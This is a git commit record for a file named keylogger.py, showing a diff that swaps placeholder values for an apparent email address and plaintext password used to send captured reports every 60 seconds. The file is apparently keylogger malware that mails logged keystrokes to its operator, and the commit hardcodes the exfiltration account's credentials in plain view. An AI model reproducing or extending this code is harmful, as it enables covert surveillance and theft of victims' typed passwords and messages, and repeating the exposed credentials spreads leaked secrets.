71cab071b4f05848546c9c721953dbe0a74b9245
Matheus Lins <166529257+madiaasmcc@users.noreply.github.com>
2025-02-27 09:32:14 -0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -22,8 +22,8 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "YOUR_USERNAME"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
+    EMAIL_ADDRESS = "gexas49419@egvoo.com"
+    EMAIL_PASSWORD = "njVG(JvJ#RpTzh4"
     SEND_REPORT_EVERY = 60 # as in seconds
     class KeyLogger:
         def __init__(self, time_interval, email, password):
